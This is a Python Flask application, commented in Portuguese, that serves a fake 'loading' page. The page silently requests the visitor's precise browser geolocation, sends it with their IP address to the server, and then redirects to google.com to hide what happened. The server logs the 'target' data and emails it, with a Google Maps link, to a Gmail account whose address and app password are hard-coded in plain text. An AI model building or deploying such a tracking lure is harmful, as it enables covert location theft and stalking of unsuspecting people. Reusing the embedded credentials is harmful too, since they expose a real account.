from flask import Flask, render_template_string, request, jsonify
import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# Configurações de E-mail (Substitua com seu e-mail e a Senha de App do Google)
EMAIL_REMETENTE = "guilhermekaumt01@gmail.com"
SENHA_APP = "newd ofub cryx dvpr"  # Crie uma App Password nas configurações da sua conta Google
EMAIL_DESTINO = "guilhermekaumt01@gmail.com"

def enviar_email(lat, lon, precisao, ip, agora):
    try:
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        
        assunto = f"[ALERTA] Nova Localização Capturada - {agora}"
        corpo = f"""
        Nova localização capturada com sucesso!
        
        Data/Hora: {agora}
        IP do Alvo: {ip}
        Latitude: {lat}
        Longitude: {lon}
        Precisão: {precisao} metros
        
        Link do Google Maps:
        {maps_link}
        """
        
        msg = MIMEMultipart()
        msg['From'] = EMAIL_REMETENTE
        msg['To'] = EMAIL_DESTINO
        msg['Subject'] = assunto
        msg.attach(MIMEText(corpo, 'plain'))
        
        # Conecta no servidor SMTP do Gmail
        servidor = smtplib.SMTP('smtp.gmail.com', 587)
        servidor.starttls()
        servidor.login(EMAIL_REMETENTE, SENHA_APP)
        servidor.sendmail(EMAIL_REMETENTE, EMAIL_DESTINO, msg.as_string())
        servidor.quit()
        print("[+] E-mail enviado com sucesso!")
    except Exception as e:
        print(f"[-] Erro ao enviar e-mail: {e}")

HTML_PAGE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 20%; background-color: #f4f4f9; }
        h2 { color: #333; }
    </style>
</head>
<body>
    <h2>Carregando conteúdo, por favor aguarde...</h2>
    <script>
        function enviarLocalizacao(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            fetch('/salvar-loc', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: lat, longitude: lon, precisao: accuracy })
            }).then(() => {
                window.location.href = "https://google.com";
            });
        }

        function erroLocalizacao(error) {
            console.log("Erro ou negado: " + error.message);
            window.location.href = "https://google.com";
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(enviarLocalizacao, erroLocalizacao, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            window.location.href = "https://google.com";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/salvar-loc', methods=['POST'])
def salvar_loc():
    dados = request.json
    lat = dados.get('latitude')
    lon = dados.get('longitude')
    precisao = dados.get('precisao')
    
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    print(f"\n[!] DADOS CAPTURADOS EM {agora}")
    print(f"IP: {ip_cliente}")
    print(f"Latitude: {lat}")
    print(f"Longitude: {lon}")
    print(f"Precisão: {precisao} metros")
    print(f"Google Maps: https://www.google.com/maps?q={lat},{lon}\n")
    
    # Dispara o envio do e-mail
    enviar_email(lat, lon, precisao, ip_cliente, agora)
    
    return jsonify({"status": "sucesso"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)